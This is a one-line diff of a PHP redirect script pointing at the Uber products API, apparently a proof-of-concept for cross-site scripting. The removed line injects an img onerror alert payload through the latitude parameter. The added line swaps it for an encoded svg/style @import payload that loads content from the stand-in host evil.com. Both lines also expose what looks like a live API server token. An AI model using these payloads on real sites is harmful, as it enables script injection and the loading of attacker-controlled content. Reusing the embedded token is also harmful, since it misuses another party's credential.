@@ -1,1 +1,1 @@
-<?php header('location: https://api.uber.com/v1/products?server_token=r3IFxM3lubYxjEIgBa2Z_3JQm8QnWdZYYPr2cW3t&latitude=aaaa%3Cimg%20src=x%20onerror=alert(document.domain)%3E%0A&longitude=116.461745')?>
+<?php header('location: https://api.uber.com/v1/products?server_token=r3IFxM3lubYxjEIgBa2Z_3JQm8QnWdZYYPr2cW3t&latitude=%3Csvg%3E%3Cstyle%3E%26commat%3Bimport%20%27%26sol%3B%26sol%3Bhttp:\evil.com%20%27%3B&longitude=116.461745')?>
